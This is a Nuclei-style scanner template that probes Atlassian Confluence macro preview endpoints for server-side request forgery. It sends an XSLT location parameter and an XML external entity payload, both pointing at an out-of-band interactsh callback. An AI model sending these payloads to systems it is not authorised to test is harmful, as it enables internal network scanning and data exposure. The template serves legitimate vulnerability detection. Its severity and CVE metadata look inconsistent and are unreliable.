flow: http(1) || http(2)
http:
- body: "{\n  \"macro\": {\n    \"name\": \"xslt\",\n    \"body\": \"\",\n    \"params\"\
    : {\n      \"location\": \"http://{{interactsh-url}}/test.xsl\"\n    }\n  }\n\
    }\n"
  headers:
    Content-Type: application/json
  matchers:
  - condition: and
    dsl:
    - contains(body, "contextConfigLocation")
    - contains(interactsh_protocol, "http")
    - status_code == 200
    type: dsl
  method: POST
  path:
  - '{{BaseURL}}/rest/tinymce/1/macro/preview'
  - '{{BaseURL}}/rest/api/content/macro/preview'
- body: "{\n  \"macro\": {\n    \"name\": \"xslt\",\n    \"body\": \"\",\n    \"params\"\
    : {\n      \"xml\": \"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://{{interactsh-url}}/test'>]><foo>&xxe;</foo>\"\
    ,\n      \"xslt\": \"<xsl:stylesheet version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform'><xsl:template\
    \ match='/'>Test</xsl:template></xsl:stylesheet>\"\n    }\n  }\n}\n"
  headers:
    Content-Type: application/json
  matchers:
  - condition: and
    dsl:
    - contains(body, "contextConfigLocation")
    - contains(interactsh_protocol, "http")
    - status_code == 200
    type: dsl
  method: POST
  path:
  - '{{BaseURL}}/rest/tinymce/1/macro/preview'
  - '{{BaseURL}}/rest/api/content/macro/preview'
id: confluence-xslt-macro-ssrf
info:
  author: ritikchaddha
  classification:
    cve-id: CVE-2024-29415
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 6.5
    cwe-id: CWE-611,CWE-918
  description: 'Atlassian Confluence Data Center and Server include an XSLT macro
    feature that may be vulnerable to Server-Side Request Forgery (SSRF). By leveraging
    the ability of the XSLT macro to access external resources, attackers can potentially
    cause the server to make HTTP requests to arbitrary URLs. This can allow internal
    network scanning, access to sensitive systems, or exposure of internal information.

    '
  metadata:
    fofa-query: icon_hash="-305179312"
    max-request: 2
    product: confluence
    runzero-review: REJECT/2026-01-30/uses interactsh
    vendor: atlassian
    verified: true
  name: Atlassian Confluence XSLT Macro - Server-Side Request Forgery
  reference:
  - https://jira.atlassian.com/browse/CONFSERVER-101489
  severity: high
  tags: atlassian,confluence,cve,cve2024,macro,ssrf,xslt
